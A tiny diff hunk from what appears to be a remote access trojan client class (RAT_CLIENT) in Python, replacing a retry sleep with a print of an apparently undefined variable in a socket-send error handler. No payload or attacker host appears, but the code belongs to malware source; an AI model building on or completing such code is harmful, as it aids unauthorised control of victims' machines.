@@ -49,7 +49,7 @@ class RAT_CLIENT:
             s.send(sending.encode())
         except socket.error as e:
             print (e)
-            time.sleep(3)
+            print(ser)
             
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
